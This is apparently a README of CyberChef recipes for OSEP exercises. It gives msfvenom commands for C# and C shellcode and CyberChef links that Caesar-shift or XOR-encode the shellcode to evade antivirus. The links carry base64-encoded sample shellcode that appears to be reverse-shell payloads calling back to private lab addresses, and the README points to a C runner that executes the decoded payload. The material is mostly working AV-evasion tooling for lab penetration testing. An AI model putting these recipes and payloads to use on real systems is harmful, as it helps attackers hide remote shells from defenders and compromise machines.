# OSEP CyberChef Recipes
Some handy recipes for OSEP exercises to help generate shellcodes with that are obfuscated to help bypass AV's

## C# Based shellcode
cmd: msfvenom -p <payload> -f csharp


### Ceasar Cipher obfuscation:
Modify the ADD module to your Ceasar ADD or replace with SUB if you want to do minus.
<https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'%5Ebyte%5C%5C%5B%5C%5C%5D%20buf%20%3D%20new%20byte%5C%5C%5B%5C%5Cd%2B%5C%5C%5D'%7D,'',true,false,true,false)From_Hex('Auto')ADD(%7B'option':'Hex','string':'9'%7D)To_Hex('0x%20with%20comma',15)Find_/_Replace(%7B'option':'Regex','string':'$'%7D,'%20%7D;',true,false,false,false)&input=Ynl0ZVtdIGJ1ZiA9IG5ldyBieXRlWzEzMF0gewoweDQ4LDB4MzEsMHhmZiwweDZhLDB4MDksMHg1OCwweDk5LDB4YjYsMHgxMCwweDQ4LDB4ODksMHhkNiwweDRkLDB4MzEsMHhjOSwKMHg2YSwweDIyLDB4NDEsMHg1YSwweGIyLDB4MDcsMHgwZiwweDA1LDB4NDgsMHg4NSwweGMwLDB4NzgsMHg1MSwweDZhLDB4MGEsCjB4NDEsMHg1OSwweDUwLDB4NmEsMHgyOSwweDU4LDB4OTksMHg2YSwweDAyLDB4NWYsMHg2YSwweDAxLDB4NWUsMHgwZiwweDA1LAoweDQ4LDB4ODUsMHhjMCwweDc4LDB4M2IsMHg0OCwweDk3LDB4NDgsMHhiOSwweDAyLDB4MDAsMHgwMSwweGJiLDB4YzAsMHhhOCwKMHgzMSwweDVhLDB4NTEsMHg0OCwweDg5LDB4ZTYsMHg2YSwweDEwLDB4NWEsMHg2YSwweDJhLDB4NTgsMHgwZiwweDA1LDB4NTksCjB4NDgsMHg4NSwweGMwLDB4NzksMHgyNSwweDQ5LDB4ZmYsMHhjOSwweDc0LDB4MTgsMHg1NywweDZhLDB4MjMsMHg1OCwweDZhLAoweDAwLDB4NmEsMHgwNSwweDQ4LDB4ODksMHhlNywweDQ4LDB4MzEsMHhmNiwweDBmLDB4MDUsMHg1OSwweDU5LDB4NWYsMHg0OCwKMHg4NSwweGMwLDB4NzksMHhjNywweDZhLDB4M2MsMHg1OCwweDZhLDB4MDEsMHg1ZiwweDBmLDB4MDUsMHg1ZSwweDZhLDB4N2UsCjB4NWEsMHgwZiwweDA1LDB4NDgsMHg4NSwweGMwLDB4NzgsMHhlZCwweGZmLDB4ZTYgfTs>

### XOR Encryption:
<https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'%5Ebyte%5C%5C%5B%5C%5C%5D%20buf%20%3D%20new%20byte%5C%5C%5B%5C%5Cd%2B%5C%5C%5D'%7D,'',true,false,true,false)From_Hex('Auto')XOR(%7B'option':'Hex','string':'4c'%7D,'Standard',false)To_Hex('0x%20with%20comma',15)Find_/_Replace(%7B'option':'Regex','string':'$'%7D,'%20%7D;',true,false,false,false)&input=Ynl0ZVtdIGJ1ZiA9IG5ldyBieXRlWzEzMF0gewoweDQ4LDB4MzEsMHhmZiwweDZhLDB4MDksMHg1OCwweDk5LDB4YjYsMHgxMCwweDQ4LDB4ODksMHhkNiwweDRkLDB4MzEsMHhjOSwKMHg2YSwweDIyLDB4NDEsMHg1YSwweGIyLDB4MDcsMHgwZiwweDA1LDB4NDgsMHg4NSwweGMwLDB4NzgsMHg1MSwweDZhLDB4MGEsCjB4NDEsMHg1OSwweDUwLDB4NmEsMHgyOSwweDU4LDB4OTksMHg2YSwweDAyLDB4NWYsMHg2YSwweDAxLDB4NWUsMHgwZiwweDA1LAoweDQ4LDB4ODUsMHhjMCwweDc4LDB4M2IsMHg0OCwweDk3LDB4NDgsMHhiOSwweDAyLDB4MDAsMHgwMSwweGJiLDB4YzAsMHhhOCwKMHgzMSwweDVhLDB4NTEsMHg0OCwweDg5LDB4ZTYsMHg2YSwweDEwLDB4NWEsMHg2YSwweDJhLDB4NTgsMHgwZiwweDA1LDB4NTksCjB4NDgsMHg4NSwweGMwLDB4NzksMHgyNSwweDQ5LDB4ZmYsMHhjOSwweDc0LDB4MTgsMHg1NywweDZhLDB4MjMsMHg1OCwweDZhLAoweDAwLDB4NmEsMHgwNSwweDQ4LDB4ODksMHhlNywweDQ4LDB4MzEsMHhmNiwweDBmLDB4MDUsMHg1OSwweDU5LDB4NWYsMHg0OCwKMHg4NSwweGMwLDB4NzksMHhjNywweDZhLDB4M2MsMHg1OCwweDZhLDB4MDEsMHg1ZiwweDBmLDB4MDUsMHg1ZSwweDZhLDB4N2UsCjB4NWEsMHgwZiwweDA1LDB4NDgsMHg4NSwweGMwLDB4NzgsMHhlZCwweGZmLDB4ZTYgfTs>


## C Based shellcode:
cmd: `msfvenom -p <payload> -f c`
Runner: https://github.com/TheWorkingDeveloper/OSEP-CyberChef-Recipes/blob/main/C-XOR-Runner.c
  
### XOR Encryption:
Based on chapter 10.2.2 of OSEP
<https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'(unsigned%20char%20buf%5C%5C%5B%5C%5C%5D%20%3D%20?%5C%5Cn%7C%5B%22;%5C%5C%5C%5Cx%5C%5Cn%5D)'%7D,'',true,false,true,false)From_Hex('Auto')XOR(%7B'option':'UTF8','string':'m'%7D,'Standard',false)To_Hex('%5C%5Cx',15)Find_/_Replace(%7B'option':'Regex','string':'(%5E%7C$)'%7D,'%22',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'%5E%22'%7D,'unsigned%20char%20buf%5B%5D%20%3D%20%5C%5Cn%22',true,false,false,false)Find_/_Replace(%7B'option':'Regex','string':'$'%7D,';',true,false,false,false)&input=dW5zaWduZWQgY2hhciBidWZbXSA9IAoiXHg2YVx4MzlceDU4XHgwZlx4MDVceDQ4XHg4NVx4YzBceDc0XHgwOFx4NDhceDMxXHhmZlx4NmFceDNjIgoiXHg1OFx4MGZceDA1XHg2YVx4MzlceDU4XHgwZlx4MDVceDQ4XHg4NVx4YzBceDc0XHgwOFx4NDhceDMxIgoiXHhmZlx4NmFceDNjXHg1OFx4MGZceDA1XHg0OFx4MzFceGZmXHg2YVx4MDlceDU4XHg5OVx4YjZceDEwIgoiXHg0OFx4ODlceGQ2XHg0ZFx4MzFceGM5XHg2YVx4MjJceDQxXHg1YVx4YjJceDA3XHgwZlx4MDVceDQ4IgoiXHg4NVx4YzBceDc4XHg1MVx4NmFceDBhXHg0MVx4NTlceDUwXHg2YVx4MjlceDU4XHg5OVx4NmFceDAyIgoiXHg1Zlx4NmFceDAxXHg1ZVx4MGZceDA1XHg0OFx4ODVceGMwXHg3OFx4M2JceDQ4XHg5N1x4NDhceGI5IgoiXHgwMlx4MDBceDA1XHgzOVx4YzBceGE4XHg3Nlx4MDNceDUxXHg0OFx4ODlceGU2XHg2YVx4MTBceDVhIgoiXHg2YVx4MmFceDU4XHgwZlx4MDVceDU5XHg0OFx4ODVceGMwXHg3OVx4MjVceDQ5XHhmZlx4YzlceDc0IgoiXHgxOFx4NTdceDZhXHgyM1x4NThceDZhXHgwMFx4NmFceDA1XHg0OFx4ODlceGU3XHg0OFx4MzFceGY2IgoiXHgwZlx4MDVceDU5XHg1OVx4NWZceDQ4XHg4NVx4YzBceDc5XHhjN1x4NmFceDNjXHg1OFx4NmFceDAxIgoiXHg1Zlx4MGZceDA1XHg1ZVx4NmFceDdlXHg1YVx4MGZceDA1XHg0OFx4ODVceGMwXHg3OFx4ZWRceGZmIgoiXHhlNiI7>
